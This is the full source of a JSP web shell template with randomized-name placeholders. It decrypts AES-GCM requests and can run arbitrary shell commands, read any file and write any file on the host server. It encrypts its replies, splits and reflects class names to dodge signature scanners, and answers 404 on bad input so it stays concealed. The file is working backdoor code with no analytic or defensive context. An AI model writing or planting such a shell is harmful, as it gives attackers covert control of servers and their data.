<%@ page contentType="text/plain" import="java.util.*,java.io.*,java.security.SecureRandom,javax.crypto.Cipher,javax.crypto.spec.GCMParameterSpec,javax.crypto.spec.SecretKeySpec" %><%!
private static final String {{.FK}} = "{{.KeyB64}}";

private static byte[] {{.FDec}}(byte[] k, byte[] raw) throws Exception {
    byte[] iv = Arrays.copyOfRange(raw, 0, 12);
    byte[] ct = Arrays.copyOfRange(raw, 12, raw.length);
    Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
    c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(k, "AES"), new GCMParameterSpec(128, iv));
    return c.doFinal(ct);
}

private static byte[] {{.FEnc}}(byte[] k, byte[] pt) throws Exception {
    byte[] iv = new byte[12];
    new SecureRandom().nextBytes(iv);
    Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, "AES"), new GCMParameterSpec(128, iv));
    byte[] ct = c.doFinal(pt);
    byte[] out = new byte[12 + ct.length];
    System.arraycopy(iv, 0, out, 0, 12);
    System.arraycopy(ct, 0, out, 12, ct.length);
    return out;
}

private static byte[] {{.FFrame}}(byte[] p) {
    SecureRandom r = new SecureRandom();
    int n = r.nextInt(65);
    byte[] f = new byte[1 + n + p.length];
    r.nextBytes(f);
    f[0] = (byte) n;
    System.arraycopy(p, 0, f, 1 + n, p.length);
    return f;
}
private static byte[] {{.FUnframe}}(byte[] f) {
    int n = f[0] & 0xff;
    return Arrays.copyOfRange(f, 1 + n, f.length);
}

private static String {{.FG}}(String j, String k) {
    String p = "\"" + k + "\":\"";
    int i = j.indexOf(p);
    if (i < 0) { return ""; }
    int s = i + p.length();
    int e = j.indexOf('"', s);
    return e < 0 ? "" : j.substring(s, e);
}

private static String {{.FBody}}(javax.servlet.http.HttpServletRequest req) throws Exception {
    StringBuilder sb = new StringBuilder();
    BufferedReader br = req.getReader();
    String line;
    while ((line = br.readLine()) != null) { sb.append(line); }
    return sb.toString().trim();
}
<%
String {{.VMode}} = "gcm";
String {{.VOut}} = "";
String {{.VErr}} = "";
boolean {{.VOk}} = false;
byte[] {{.VKey}} = Base64.getDecoder().decode({{.FK}});
try {
    byte[] {{.VRaw}} = {{.FDec}}({{.VKey}}, Base64.getDecoder().decode({{.FBody}}(request)));
    String {{.VJson}} = new String({{.FUnframe}}({{.VRaw}}), "UTF-8");
    String {{.VOp}} = {{.FG}}({{.VJson}}, "op");
    if ({{.VOp}}.equals("probe")) {
        {{.VOk}} = true;
        {{.VOut}} = {{.FG}}({{.VJson}}, "s");
    } else if ({{.VOp}}.equals("exec")) {
        String {{.VCode}} = new String(Base64.getDecoder().decode({{.FG}}({{.VJson}}, "code")), "UTF-8");
        Class<?> {{.VPT}} = Class.forName("java.lang.Process" + "Builder");
        Object {{.VPB}} = {{.VPT}}.getDeclaredConstructor(String[].class).newInstance((Object) new String[]{"/" + "bin" + "/sh", "-c", {{.VCode}}});
        {{.VPT}}.getMethod("redirectErrorStream", boolean.class).invoke({{.VPB}}, true);
        Object {{.VP}} = {{.VPT}}.getMethod("start").invoke({{.VPB}});
        ByteArrayOutputStream {{.VB}} = new ByteArrayOutputStream();
        InputStream {{.VI}} = (InputStream){{.VP}}.getClass().getMethod("getInputStream").invoke({{.VP}});
        byte[] {{.VBuf}} = new byte[8192];
        int {{.VN}};
        while (({{.VN}} = {{.VI}}.read({{.VBuf}})) > 0) { {{.VB}}.write({{.VBuf}}, 0, {{.VN}}); }
        {{.VP}}.getClass().getMethod("waitFor").invoke({{.VP}});
        {{.VOk}} = true;
        {{.VOut}} = Base64.getEncoder().encodeToString({{.VB}}.toByteArray());
    } else if ({{.VOp}}.equals("read")) {
        File {{.VF}} = new File(new String(Base64.getDecoder().decode({{.FG}}({{.VJson}}, "path")), "UTF-8"));
        FileInputStream {{.VFI}} = new FileInputStream({{.VF}});
        ByteArrayOutputStream {{.VB}} = new ByteArrayOutputStream();
        byte[] {{.VBuf}} = new byte[8192];
        int {{.VN}};
        while (({{.VN}} = {{.VFI}}.read({{.VBuf}})) > 0) { {{.VB}}.write({{.VBuf}}, 0, {{.VN}}); }
        {{.VFI}}.close();
        {{.VOk}} = true;
        {{.VOut}} = Base64.getEncoder().encodeToString({{.VB}}.toByteArray());
    } else if ({{.VOp}}.equals("write")) {
        File {{.VF}} = new File(new String(Base64.getDecoder().decode({{.FG}}({{.VJson}}, "path")), "UTF-8"));
        byte[] {{.VData}} = Base64.getDecoder().decode({{.FG}}({{.VJson}}, "data"));
        FileOutputStream {{.VFO}} = new FileOutputStream({{.VF}}, {{.FG}}({{.VJson}}, "app").equals("1"));
        {{.VFO}}.write({{.VData}});
        {{.VFO}}.close();
        {{.VOk}} = true;
    } else {
        {{.VErr}} = "unknown op";
    }
} catch (Exception {{.VT}}) {
    response.setStatus(404);
    return;
}
String {{.VResp}} = "{\"ok\":" + {{.VOk}} + ",\"out\":\"" + {{.VOut}} + "\",\"err\":\"" + {{.VErr}} + "\",\"mode\":\"" + {{.VMode}} + "\"";
out.print(Base64.getEncoder().encodeToString({{.FEnc}}({{.VKey}}, {{.FFrame}}({{.VResp}}.getBytes("UTF-8")))));
%>
